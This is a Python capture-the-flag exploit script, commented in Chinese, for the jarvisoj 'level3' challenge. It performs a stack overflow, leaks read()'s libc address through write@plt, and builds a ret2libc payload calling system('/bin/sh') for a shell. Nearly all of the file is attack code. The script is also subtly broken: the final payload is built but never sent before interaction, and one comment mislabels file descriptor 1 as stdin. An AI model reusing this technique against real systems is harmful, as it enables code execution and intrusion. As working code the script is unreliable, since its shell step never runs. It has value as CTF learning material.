#!/usr/bin/env python
# encoding:utf-8

import zio
import binascii

write_address = zio.l32(0x08048340) # write() 函数在 plt 的地址
got_read_address = zio.l32(0x0804A00C) # got 表中用于保存 read() 函数真实地址的内存地址

payload = "A" * 0x88 + "BBBB"
payload += write_address
payload += zio.l32(0x0804844B) # vulnerable_function() 的地址
payload += zio.l32(0x01) # write() 函数的第一个参数 , 表示文件描述符 , stdin (0)
payload += got_read_address # write() 函数的第二个参数 , 写入的数据
payload += zio.l32(0x04) # write() 函数的第三个参数 , 表示写入的长度

#Io = zio.zio(("pwn2.jarvisoj.com", 9879))
Io = zio.zio("./level3")
Io.write(payload)
Io.readline()
temp = Io.readline()
print ">"+temp+"<"
read_address = binascii.b2a_hex(temp[0:8])[0:8]
print read_address
read_address = int(read_address, 16)
print hex(read_address)

# sun@ubuntu:~/pwnme/lessons/jarvisoj/6$ strings -a -t x libc-2.19.so | grep "/bin/sh"
#  16084c /bin/sh
#sun@ubuntu:~/pwnme/lessons/jarvisoj/6$ readelf ./libc-2.19.so -a | grep " read@"
#    950: 000daf60   125 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.0
#sun@ubuntu:~/pwnme/lessons/jarvisoj/6$ readelf ./libc-2.19.so -a | grep " system@"
#   1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
#sun@ubuntu:~/pwnme/lessons/jarvisoj/6$ readelf ./libc-2.19.so -a | grep " exit@"
#    139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0

#read_libc_address = 0xdaf60
read_libc_address = 0x000d41c0

offset = read_address - read_libc_address

#system_address = offset + 0x40310
system_address = offset + 0x0003a940
#exit_address = offset + 0x33260
exit_address = offset + 0x0002e7b0
#bin_sh_address = offset + 0x16084C
bin_sh_address = offset + 0x158e8b

payload = "A" * 0x88 + "BBBB"
payload += zio.l32(system_address)
payload += zio.l32(exit_address)
payload += zio.l32(bin_sh_address)

Io.interact()
